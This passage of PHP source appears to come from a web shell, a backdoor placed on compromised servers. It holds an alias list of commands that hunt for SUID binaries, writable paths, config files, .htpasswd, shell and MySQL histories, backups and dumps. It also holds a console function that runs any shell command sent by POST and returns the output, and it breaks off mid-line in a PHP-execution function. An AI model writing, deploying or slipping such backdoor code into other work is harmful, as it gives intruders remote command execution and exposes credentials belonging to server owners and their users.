  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"
	);
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
	if(isset($_POST['ajax'])) {
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "c_='".$GLOBALS['cwd']."';";
			}
		}
		echo "d.cf.output.value+='".$temp."';";
		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	hardHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>";
	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	
	echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
	}
	echo '</textarea><table style="border:1px solid #060a10;background-color:#060a10;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
	echo '</form></div><script>d.cf.cmd.focus();</script>';
	hardFooter();
}
function actionPhp() {
	if( isset($_POST['ajax']) ) {
		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		$out = ex(@$_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars($out),"

	\'
